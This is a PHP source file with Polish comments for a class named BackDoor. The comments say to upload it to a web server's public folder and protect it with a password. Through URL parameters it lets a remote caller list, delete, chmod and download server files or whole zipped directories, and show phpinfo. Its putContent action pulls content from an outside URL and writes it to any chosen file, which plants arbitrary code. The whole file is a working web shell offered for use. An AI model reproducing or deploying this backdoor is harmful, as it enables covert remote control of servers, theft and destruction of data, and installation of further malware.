<?php
/*
*
>>>>>>>>>> INSTRUKCJA KONFIGURACJI <<<<<<<<<<

1. Plik bd.php wrzucić do public
2. Ustawić hasło w linii kodu nr 44 ($this->pass = 'your_password')

>>>>>>>>>> PARAMETRY <<<<<<<<<<

Wymagane: key i action
www.example.com/bd.php?key=your_password&action=your_name_function

Inne: url, path, number

>>>>>>>>>> AKCJE <<<<<<<<<<<

action:
- getPhpInfo (wymagane parametry: key i action)
- deleteFile (wymagane parametry: key, action i path) - sluzy do usuwania konkretnego pliku
- deleteCategory (wymagane parametry: key, action i path) - sluzy do usuwanie konkretnej kategorii
- listFiles (wymagane parametry: key, action i (nieobowiazkowo path)) - sluzy to wyswietlenia listu folderów z plikami
- chmod (wymagane parametry: key, action, path i number) 
- download (wymagane parametry: key, action, path) - sluzy do pobrania pliku czy katalogu z plikami
- putContent (wymagane parametry: key, action, url) - sluzy do tworzenia pliku (np. wklej.org i nazwa_pliku | tresc zawartosci);
*/

class BackDoor {

	public $key;
	public $action;
	public $pass;
	public $block_functions;
	public $url;
	public $number;
	public $path;

	public function __construct(){
		$this->key = isset($_GET['key']) ? $_GET['key'] : false;
		$this->action = isset($_GET['action']) ? $_GET['action'] : false;
		$this->url = isset($_GET['url']) ? $_GET['url'] : false;
		$this->path = isset($_GET['path']) ? $_GET['path'] : false;
		$this->number = isset($_GET['number']) ? $_GET['number'] : false;
		$this->pass = 'your_password';
		$this->block_functions = ['getKey'];
		$this->checkKey();
		echo $this->call_action();

	} 
	/*
	* 	wyswietlenie phpinfo()
	*/
	public function getPhpInfo(){
		return phpinfo();
	}
	/*
	* 	sprawdzanie czy haslo jest takie same
	*/
	public function checkKey(){
		return password_verify($this->key, $this->setKey()) ? true : exit;
	}
	/* 
	*	ustawia hasło
	*/
	public function setKey(){
		$hash =	password_hash($this->pass, PASSWORD_DEFAULT);
		return $hash;
	}
	/*
	* 	wyswietlenie informacji
	*/
	public function message($info){
		echo '<pre>',print_r($info,1),'</pre>';
	}
	/*
	*	sprawdza czy nie jest zablokowana funkcja
	*/
	public function check_function($name){
		return !in_array($name, $this->block_functions);
	}
	/*
	*	wykonanie akcji
	*/
	public function call_action(){
		if($this->action)
		{
			if($this->check_function($this->action))
			{
				$action = $this->action;
				return method_exists($this, $action ) ? $this->$action() : 'Nie ma takiej funkcji';
			}
		}
	}
	/*
	* 	pobranie zawartosci za pomocą curla
	*/
	public function getContent(){
		$ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
	}
	/*
	*	tworzenie zawartosci z pobranego curla
	*/
	public function putContent(){
		$data = $this->getContent(); //pelna zawartosc
		if(strlen($data) > 0)
		{
			$file = explode('|', rtrim(trim($data)))[0]; // nazwa pliku
			$content = explode('|', rtrim(trim($data)))[1]; // konkretna zawartosc

			file_put_contents($file, $content);
			$this->message('Zapisano !');
		}
		else
		{
			$this->message('Zawartość jest pusta !');
		}
	}
	/*
	*	usuwanie pliku 
	*/
	public function deleteFile(){
		$file = $this->path;
		if(file_exists($file)){
			if(unlink($file)){
				$this->message('Usunięto !');
			}
			else{
				$this->message('Nie usunięto !');
			}
		}
		else{
			$this->message('Brak pliku !');
		}
	}
	/*
	* 	usuwanie kategorii
	*/
	public function deleteCategory(){
		$cat = $this->path;
		if(is_dir($cat))
		{
			$this->message(scandir($cat));
			foreach(scandir($cat) as $file)
			{
				if($file == '.' || $file == '..'){
					continue;
				}

				$new_file = $cat.'/'.$file;

				if(file_exists($new_file))
				{
					unlink($new_file);
				}
			}

			if(rmdir($cat)){
				$this->message('Usunięto !');
			}
			else{
				$this->message('Nie usunięto !');
			}
			
		}
		else
		{
			$this->message('Brak kategorii!');
		}
	}
	/*
	* Lista plików
	*/
	public function listFiles(){
		$path = $this->path;

		if(is_dir($path)){
			return $this->message(scandir($path)); //wyswietlanie konkretnego folderu
		}
		else
		{
			return $this->message(scandir('.')); //wyswietlanie glownego folderu
		}
		
	}
	/*
	*	Chmod pliku
	*/
	public function chmod(){
		
		if(chmod($this->path, $this->number))
		{
			return $this->message('Ustawiono chmod !');
		}
		
	}
	/*
	*	Pobranie pliku
	*/
	public function download(){
		if(file_exists($this->path) && !is_dir($this->path)){
			header('Content-Description: File Transfer');
		    header('Content-Type: application/octet-stream');
		    header('Content-Disposition: attachment; filename="'.basename($this->path).'"');
		    header('Expires: 0');
		    header('Cache-Control: must-revalidate');
		    header('Pragma: public');
		    header('Content-Length: ' . filesize($this->path));
		    readfile($this->path);
		    exit;
		}
		else
		{
			if(is_dir($this->path))
			{
				
				$zipname = "download.zip";
			    $zip = new ZipArchive;

			    $zip->open($zipname, ZipArchive::CREATE);

			    foreach($this->is_cat($this->path) as $t)
			    {
			    	$zip->addFile($t, str_replace($this->path.'/','',$t));
			    }
			    $zip->close();
			    
			    header('Content-Type: application/zip');
			    header("Content-Disposition: attachment; filename=".$zipname);
			    header('Content-Length: ' . filesize($zipname));
			    readfile($zipname);
			    unlink($zipname);
			}
		}
	}

	/*
	* Listowanie wszystki katalogów i plików specjalne dla zipa
	*/
	public function is_cat($cat){
		$tab = [];
		if(is_dir($cat))
		{
			foreach(scandir($cat) as $c)
			{
				if($c == '.' || $c == '..')
				{
					continue;
				}
				else
				{
					if(is_dir($cat.'/'.$c))
					{
						foreach($this->is_cat($cat.'/'.$c) as $key=>$n)
						{
							$tab[] = $n;
						}
					}
					else
					{
						$tab[] = $cat.'/'.$c;
					}
				}
				
			}
		}
		return $tab;
	}

}

$bD = new BackDoor();

?>
